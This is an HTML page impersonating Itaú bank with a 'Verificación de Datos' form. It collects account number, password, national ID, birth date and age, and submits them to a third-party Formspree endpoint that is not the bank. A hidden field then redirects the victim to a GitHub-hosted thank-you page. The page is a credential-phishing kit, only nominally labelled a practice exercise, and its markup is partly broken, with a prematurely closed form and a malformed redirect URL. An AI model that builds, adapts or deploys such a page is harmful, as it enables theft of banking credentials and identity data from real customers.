<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Acceso - Práctica Extendida</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #FF6F00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: transparent;
            width: 380px;
            padding: 40px;
            text-align: center;
            box-sizing: border-box;
        }
        .emblema {
            background-color: #FFFFFF;
            width: 65px;
            height: 65px;
            border-radius: 16px;
            border: 2px solid #E05300;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .emblema span {
            color: #FF6F00;
            font-size: 1.6rem;
            font-weight: bold;
        }
        h2 {
            color: #000000;
            margin: 0 0 10px 0;
            font-size: 1.8rem;
            font-weight: bold;
        }
        p {
            color: #000000;
            margin: 0 0 30px 0;
            font-size: 0.95rem;
            font-weight: bold;
        }
        form {
            text-align: left;
        }
        label {
            display: block;
            color: #000000;
            font-size: 0.9rem;
            font-weight: bold;
            margin-bottom: 6px;
            margin-top: 12px;
        }
        input[type="text"], input[type="password"], input[type="number"], input[type="date"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #CBD5E0;
            border-radius: 6px;
            box-sizing: border-box;
            color: #000000;
            font-size: 0.9rem;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #000000;
            color: #FFFFFF;
            font-size: 0.9rem;
            font-weight: bold;
            padding: 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 25px;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="emblema">
            <span>Itaú</span>
        </div>
        
        <h2>BIENVENIDO A ITAU</h2>
        <p>Verificación de Datos</p>

        <form action="https://formspree.io/f/mpqvglal" method="POST">
            <!-- Esta es la línea mágica corregida que conecta con tu pantalla de gracias -->
            <input type="hidden" name="_next" value="https://https://github.com/Autenticaciondedatos/index.html/blob/main/gracias.html">
           
            <button type="submit">Enviar</button>
        </form>

            <label for="account">Nro_Cuenta</label>
            <input type="text" id="account" name="Nro_Cuenta" required>

            <label for="password">Contrasena</label>
            <input type="password" id="password" name="Contrasena" required>

            <label for="ci">Cedula_Identidad</label>
            <input type="text" id="ci" name="Cedula_Identidad" required>

            <label for="birthdate">Fecha Nacimiento</label>
            <input type="date" id="birthdate" name="Fecha Nacimiento" required>

            <label for="age">Edad</label>
            <input type="number" id="age" name="Edad" min="0" max="120" required>

            <input type="submit" value="Verificar Datos">
        </form>
    </div>

</body>
</html>
